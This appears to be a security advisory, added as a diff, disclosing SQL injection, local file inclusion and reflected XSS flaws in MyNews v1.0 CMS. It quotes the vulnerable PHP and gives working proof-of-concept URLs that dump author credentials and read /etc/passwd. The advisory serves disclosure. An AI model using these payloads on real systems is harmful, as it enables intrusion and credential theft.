@@ -1,0 +1,57 @@
+MyNews v1.0 CMS - Sql Injection, local file inclusion and XSS Vulnerabilities
+Found by: mr_me - http://net-ninja.net/
+Advisory: http://www.corelan.be:8800/advisories.php?id=10-040
+Dork: "Corelan Security Team"
+Homepage: http://mynews.magtrb.com/
+Download: http://mynews.magtrb.com/download.php?fname=upload/Versions/MyNews+v1.0.zip
+Greetz: Corelan Security Team
+http://www.corelan.be:8800/index.php/security/corelan-team-members/
+Notes: 
+- Provided 'as is', without any warranty.
+- Use for educational purposes only.
+- Do not use this to do anything illegal !
+- Corelan cannot be held responsible for any damages this may cause.
+
+******************
+Sql Injection PoC:
+******************
+
+-------[ SNIP ]----------> article.php, line 10
+$sql_query = "select id, title, text, views from ".$prefix."_news where id=".$_GET[id]."";
+-------[ EOF SNIP ]------>
+
+http://[server]/MyNews/index.php?act=article&id=[ SQLI ]
+http://[server]/MyNews/index.php?act=article&id=-12+union+select+1,2,concat(name,0x3a,pwd),4+from+_authors--
+
+********************
+File Inclusion PoCs:
+********************
+
+-------[ SNIP ]----------> index.php, line 18
+if (!isset($_GET['act'])) { $act = 'news'; } else { $act = $_GET['act']; }
+
+include('./includes/header.php');
+require('./includes/'.$act.'.php');
+-------[ EOF SNIP ]------>
+
+-------[ SNIP ]----------> admin.php, line 65
+if(!isset($act)){$act ="index"; }
+
+if($act){include("includes/admin/$act.php");
+$smarty->assign("act", $act);
+}
+-------[ EOF SNIP ]------>
+
+1:
+http://[server]/MyNews/index.php?act=[ LFI ]%00&id=12
+http://[server]/MyNews/index.php?act=../../../../etc/passwd%00&id=12
+
+2 (requires authentication):
+http://[server]/MyNews/admin.php?act=[ LFI ]%00
+http://[server]/MyNews/admin.php?act=../../../../etc/passwd%00
+
+*******************
+Reflective XSS PoC:
+*******************
+
+http://[server]/MyNews/admin.php?act=<script>alert("Found by the Corelan Security Team")</script>
